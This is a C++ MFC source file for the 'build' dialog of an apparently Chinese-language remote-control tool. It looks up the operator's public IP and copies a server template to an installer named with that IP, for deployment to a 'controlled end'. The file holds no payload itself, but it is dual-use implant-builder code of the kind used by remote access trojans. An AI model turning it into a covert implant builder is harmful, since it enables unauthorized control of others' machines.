// BuildDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "BuildDlg.h"
#include "MainFrm.h"
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

extern CMainFrame *g_pFrame;

IMPLEMENT_DYNCREATE(CBuildDlg, CFormView)

CBuildDlg::CBuildDlg()
	: CFormView(CBuildDlg::IDD)
{
}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_BTN_BUILD, m_btnbuild);
	DDX_Control(pDX, IDC_RADIO1, m_ck1);
	DDX_Control(pDX, IDC_RADIO2, m_ck2);
}

BEGIN_MESSAGE_MAP(CBuildDlg, CFormView)
	ON_WM_PAINT()
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BTN_BUILD, &CBuildDlg::OnBnClickedBtnBuild)
END_MESSAGE_MAP()

#ifdef _DEBUG
void CBuildDlg::AssertValid() const
{
	CFormView::AssertValid();
}

#ifndef _WIN32_WCE
void CBuildDlg::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif
#endif //_DEBUG

BOOL CBuildDlg::PreCreateWindow(CREATESTRUCT& cs)
{
	cs.style &= ~WS_BORDER;
	return CFormView::PreCreateWindow(cs);
}

void CBuildDlg::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();

	m_brush.CreateSolidBrush(RGB(255,255,255));

	CFont m_font1,m_font2;
	m_font1.CreatePointFont(110,_T("微软雅黑"));
	GetDlgItem(IDC_STATIC_BUILD)->SetFont(&m_font1);
	m_font1.Detach();

	m_font2.CreatePointFont(90,_T("微软雅黑"));
	GetDlgItem(IDC_STATIC_BUILD2)->SetFont(&m_font2);
	m_font2.Detach();

	m_btnbuild.EnableMarkup();
	m_btnbuild.SetBitmap(0, IDB_PNG_BUILD);
	m_btnbuild.SetUseVisualStyle(TRUE);

	m_ck1.SetFlatStyle(TRUE);
	m_ck2.SetFlatStyle(TRUE);
	m_ck1.SetUseVisualStyle(TRUE);
	m_ck2.SetUseVisualStyle(TRUE);

	CButton* radio=(CButton*)GetDlgItem(IDC_RADIO1);
	radio->SetCheck(1);
}

void CBuildDlg::OnPaint()
{
	CPaintDC dc(this);

	CRect rect;
	GetClientRect(rect);
	dc.FillSolidRect(rect,RGB(255, 255, 255));
}

HBRUSH CBuildDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CFormView::OnCtlColor(pDC, pWnd, nCtlColor);

	switch(nCtlColor)
	{
	case CTLCOLOR_STATIC:
		{
			pDC->SetBkMode(TRANSPARENT);
			if(pWnd->GetDlgCtrlID() == IDC_STATIC_BUILD)
				pDC->SetTextColor(RGB(65,105,225));
			else
				pDC->SetTextColor(RGB(110,110,110));
			hbr=(HBRUSH)m_brush;
			break;
		}
	case CTLCOLOR_DLG:
		return (HBRUSH)m_brush.GetSafeHandle();
	case CTLCOLOR_BTN:
		hbr=(HBRUSH)m_brush;
		break;
	default:
		break;
	}
	return hbr;
}

static CString TrimIPText(const CString& text)
{
	CString result = text;
	result.Trim(_T("\r\n\t "));
	return result;
}

static BOOL IsValidIPv4(LPCTSTR ip)
{
	if (ip == NULL || *ip == 0)
		return FALSE;

	int a = 0, b = 0, c = 0, d = 0;
	TCHAR extra = 0;
	if (_stscanf(ip, _T("%d.%d.%d.%d%c"), &a, &b, &c, &d, &extra) != 4)
		return FALSE;

	return a >= 0 && a <= 255 && b >= 0 && b <= 255 && c >= 0 && c <= 255 && d >= 0 && d <= 255;
}

static CString ReadTextFile(LPCTSTR path)
{
	CFile file;
	if (!file.Open(path, CFile::modeRead | CFile::shareDenyWrite))
		return _T("");

	ULONGLONG len = file.GetLength();
	if (len == 0 || len > 65536)
	{
		file.Close();
		return _T("");
	}

	CString data;
	LPTSTR buffer = data.GetBuffer((int)len + 1);
	file.Read(buffer, (UINT)len);
	buffer[len] = 0;
	data.ReleaseBuffer();
	file.Close();
	return TrimIPText(data);
}

static CString FetchIPFromURL(LPCTSTR url, LPCTSTR tempFile)
{
	DeleteFile(tempFile);
	if (URLDownloadToFile(NULL, url, tempFile, 0, NULL) != S_OK)
		return _T("");

	CString ip = ReadTextFile(tempFile);
	DeleteFile(tempFile);
	if (IsValidIPv4(ip))
		return ip;

	return _T("");
}

static CString GetLocalIPv4()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return _T("");

	CString result;
	char hostname[256] = {0};
	if (gethostname(hostname, sizeof(hostname) - 1) == 0)
	{
		hostent* host = gethostbyname(hostname);
		if (host != NULL && host->h_addr_list != NULL && host->h_addr_list[0] != NULL)
			result = CString(inet_ntoa(*(in_addr*)host->h_addr_list[0]));
	}

	WSACleanup();
	return result;
}

static BOOL ResolveServerTemplate(LPCTSTR exeDir, LPTSTR templatePath, DWORD cchTemplatePath)
{
	_stprintf_s(templatePath, cchTemplatePath, _T("%s\\Dat\\Install.dat"), exeDir);
	return GetFileAttributes(templatePath) != INVALID_FILE_ATTRIBUTES;
}

CString GetInternetIP()
{
	TCHAR tempPath[MAX_PATH] = {0};
	GetTempPath(_countof(tempPath), tempPath);

	TCHAR tempFile[MAX_PATH] = {0};
	_stprintf_s(tempFile, _T("%sve_ip.txt"), tempPath);

	static const LPCTSTR kIpUrls[] = {
		_T("https://api.ipify.org"),
		_T("http://api.ipify.org"),
		_T("https://checkip.amazonaws.com"),
	};

	for (int i = 0; i < _countof(kIpUrls); ++i)
	{
		CString ip = FetchIPFromURL(kIpUrls[i], tempFile);
		if (!ip.IsEmpty())
			return ip;
	}

	CString localIP = GetLocalIPv4();
	if (IsValidIPv4(localIP) && localIP != _T("127.0.0.1"))
		return localIP;

	return _T("");
}

void CBuildDlg::OnBnClickedBtnBuild()
{
	TCHAR exeDir[MAX_PATH] = {0};
	GetModuleFileName(NULL, exeDir, _countof(exeDir));
	LPTSTR lastSlash = _tcsrchr(exeDir, _T('\\'));
	if (lastSlash != NULL)
		*lastSlash = _T('\0');

	TCHAR templatePath[MAX_PATH] = {0};
	if (!ResolveServerTemplate(exeDir, templatePath, _countof(templatePath)))
	{
		MessageBox(
			_T("未找到 Release 版服务端模板 Dat\\Install.dat。\r\n")
			_T("请用 Visual Studio 以 Release 配置编译 Server 项目后再生成。\r\n")
			_T("（勿使用 Debug 版 Install.exe，被控端会缺少 MSVCR120D.dll）"),
			_T("提示"), MB_ICONERROR);
		return;
	}

	CString strIP = GetInternetIP();
	if (strIP.IsEmpty())
	{
		MessageBox(_T("无法获取本机 IP 地址，请检查网络连接后重试。"),
			_T("提示"), MB_ICONWARNING);
		return;
	}

	TCHAR outputPath[MAX_PATH] = {0};
	CButton* radio = (CButton*)GetDlgItem(IDC_RADIO1);
	if (radio->GetCheck())
		_stprintf_s(outputPath, _T("%s\\Install_%s_v1.exe"), exeDir, (LPCTSTR)strIP);
	else
		_stprintf_s(outputPath, _T("%s\\Install_%s_v2.exe"), exeDir, (LPCTSTR)strIP);

	if (!CopyFile(templatePath, outputPath, FALSE))
	{
		CString msg;
		msg.Format(_T("生成服务端失败，无法复制文件（错误码 %u）。"), GetLastError());
		MessageBox(msg, _T("提示"), MB_ICONERROR);
		return;
	}

	CString msg;
	msg.Format(_T("生成成功！\r\n输出文件：%s\r\n\r\n请将生成的安装包部署到被控端。"), outputPath);
	MessageBox(msg, _T("提示"), MB_ICONINFORMATION);

	g_pFrame->OnFileUser();
}

